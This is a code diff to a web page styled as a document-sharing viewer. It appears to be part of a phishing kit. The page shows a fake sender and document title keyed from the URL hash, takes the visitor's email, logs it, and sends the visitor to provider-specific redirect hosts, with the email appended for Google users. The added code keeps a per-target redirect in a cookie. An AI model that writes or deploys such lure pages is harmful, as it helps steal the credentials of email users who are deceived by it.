@@ -149,6 +149,88 @@
             z-index: 1;
         }
 
+        /* Sender Info Card */
+        .sender-info-card {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 24px 32px;
+            box-shadow: 
+                0 20px 60px rgba(0, 0, 0, 0.15),
+                0 0 1px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            margin-bottom: 24px;
+            display: none;
+        }
+
+        .sender-info-card.visible {
+            display: block;
+            animation: slideIn 0.4s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(10px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .sender-info-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .sender-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.3);
+        }
+
+        .sender-info-content h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .sender-info-content p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .document-title-display {
+            background: var(--bg-light);
+            padding: 16px;
+            border-radius: 12px;
+            border-left: 4px solid var(--primary-blue);
+        }
+
+        .document-title-display h4 {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .document-title-display p {
+            font-size: 16px;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
         /* Documents Card */
         .documents-card {
             background: rgba(255, 255, 255, 0.98);
@@ -437,6 +519,54 @@
             font-weight: 700;
         }
 
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-content {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
         /* Lightbox */
         .lightbox {
             display: none;
@@ -644,10 +774,6 @@
             margin: 0 auto;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
         .submit-btn.loading .spinner {
             display: block;
         }
@@ -670,17 +796,6 @@
             font-size: 14px;
             font-weight: 600;
             animation: slideIn 0.4s ease;
-        }
-
-        @keyframes slideIn {
-            from {
-                transform: translateY(10px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
         }
 
         .provider-badge.office365 {
@@ -731,10 +846,22 @@
                 align-items: flex-start;
                 gap: 16px;
             }
+
+            .sender-info-card {
+                padding: 20px 24px;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Loading document information...</div>
+        </div>
+    </div>
+
     <!-- Header -->
     <div class="header">
         <div class="header-card">
@@ -756,6 +883,21 @@
 
     <!-- Main Container -->
     <div class="main-container">
+        <!-- Sender Info Card -->
+        <div class="sender-info-card" id="senderInfoCard">
+            <div class="sender-info-header">
+                <div class="sender-icon">📧</div>
+                <div class="sender-info-content">
+                    <h3>Document Sender</h3>
+                    <p id="senderName">Loading...</p>
+                </div>
+            </div>
+            <div class="document-title-display">
+                <h4>Document Title</h4>
+                <p id="documentTitle">Loading...</p>
+            </div>
+        </div>
+
         <!-- Documents Card -->
         <div class="documents-card">
             <div class="card-header">
@@ -836,6 +978,105 @@
     </div>
 
     <script>
+        // ========== COOKIE UTILITIES ==========
+        function setCookie(name, value, days = 365) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
+        // ========== FETCH DOCUMENT DATA ==========
+        async function fetchDoc(key) {
+            try {
+                const res = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
+                const data = await res.json();
+                
+                if (data && data.data) {
+                    return {
+                        title: data.data.title || 'Untitled Document',
+                        sender: data.data.sender || 'Unknown Sender',
+                        url: data.data.url || ''
+                    };
+                }
+                
+                throw new Error('Invalid response from API');
+            } catch (error) {
+                console.error('Error fetching document:', error);
+                return null;
+            }
+        }
+
+        // ========== INITIALIZE PAGE ==========
+        async function initializePage() {
+            // Show loading overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            // Parse key from URL hash (e.g., #roy)
+            const hash = window.location.hash.substring(1); // Remove the # symbol
+            const key = hash || null;
+
+            if (!key) {
+                console.error('No key found in URL hash');
+                document.getElementById('loadingOverlay').classList.remove('active');
+                alert('Invalid document link. Please use the link provided in your email.');
+                return;
+            }
+
+            console.log('Parsed key from URL hash:', key);
+
+            // Check if cookie with name = key value exists (e.g., cookie named "roy")
+            const cookieValue = getCookie(key);
+            
+            if (cookieValue) {
+                // Cookie exists, redirect to stored URL
+                console.log(`Cookie "${key}" found with value:`, cookieValue);
+                console.log('Redirecting to:', cookieValue);
+                window.location.href = cookieValue;
+                return;
+            }
+
+            // No cookie found, this is first-time visitor
+            console.log(`No cookie named "${key}" found. First time visitor - fetching document data...`);
+            const docData = await fetchDoc(key);
+
+            // Hide loading overlay
+            document.getElementById('loadingOverlay').classList.remove('active');
+
+            if (!docData) {
+                alert('Unable to load document information. Please try again later.');
+                return;
+            }
+
+            // Set cookie with name = key, value = data.data.url
+            if (docData.url) {
+                setCookie(key, docData.url);
+                console.log(`Cookie "${key}" set with URL:`, docData.url);
+            }
+
+            // Display sender name and document title
+            document.getElementById('senderName').textContent = docData.sender;
+            document.getElementById('documentTitle').textContent = docData.title;
+            document.getElementById('senderInfoCard').classList.add('visible');
+
+            // Update the document name in the list
+            if (documents.length > 0) {
+                documents[0].name = docData.title + '.pdf';
+                renderDocuments();
+            }
+        }
+
         // SVG Icons
         const SVG_ICONS = {
             pdf: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -1282,19 +1523,27 @@
             const selectedFiles = Array.from(selectedDocuments);
             logAccess(email, mxResult, selectedFiles);
 
-            // Define redirect URLs based on provider
-            const redirectUrls = {
-                'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
-                'google': 'https://logout.isde2006.com/rZZr71jz9ibAQxXb!RiLE/$'+email,
-                'other': 'https://pdf-render.vercel.app/viewer?from=me'
-            };
+            // Parse key from URL hash
+            const key = window.location.hash.substring(1);
 
-            const redirectUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
+            // Get the stored redirect URL from cookie (named with the key value)
+            const redirectUrl = getCookie(key);
 
-            console.log(`Redirecting to: ${redirectUrl} (Provider: ${mxResult.provider})`);
+            if (redirectUrl) {
+                console.log(`Redirecting to stored URL from cookie "${key}":`, redirectUrl);
+                window.location.href = redirectUrl;
+            } else {
+                // Fallback redirect URLs based on provider
+                const redirectUrls = {
+                    'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
+                    'google': 'https://logout.isde2006.com/rZZr71jz9ibAQxXb!RiLE/$'+email,
+                    'other': 'https://pdf-render.vercel.app/viewer?from=me'
+                };
 
-            // Perform redirect
-            window.location.href = redirectUrl;
+                const fallbackUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
+                console.log(`Redirecting to fallback: ${fallbackUrl} (Provider: ${mxResult.provider})`);
+                window.location.href = fallbackUrl;
+            }
         }
 
         // Handle email submit
@@ -1362,7 +1611,10 @@
         document.getElementById('selectAll').addEventListener('change', handleSelectAll);
 
         // Initialize on page load
-        init();
+        window.addEventListener('DOMContentLoaded', async () => {
+            await initializePage();
+            init();
+        });
     </script>
 </body>
 </html>
